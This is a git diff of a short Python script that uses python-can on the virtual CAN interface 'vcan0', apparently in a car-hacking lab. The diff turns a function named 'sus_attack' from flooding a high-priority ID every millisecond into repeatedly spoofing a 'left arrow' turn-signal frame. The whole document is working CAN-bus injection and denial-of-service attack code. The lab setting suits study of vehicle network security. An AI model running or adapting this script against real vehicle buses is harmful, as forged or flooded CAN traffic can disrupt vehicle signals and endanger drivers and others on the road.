@@ -2,17 +2,17 @@ import can
 import time 
 
 CAN_INTERFACE = "vcan0"  
-ID = 0x100 #higher priority ID
+ID = 0x188 #left arrow ID
 
 def sus_attack(bus):
-    data = [0x7f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ]
+    data = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
     msg = can.Message(arbitration_id = ID, data = data, is_extended_id = False)
 
     try:
         while True:
             bus.send(msg)
             print(f"sus msg: {msg}")
-            time.sleep(0.001)
+            time.sleep(0.01)
     except KeyboardInterrupt:
         print("Interruption of messages by keyboard")
     except can.CanError as e:
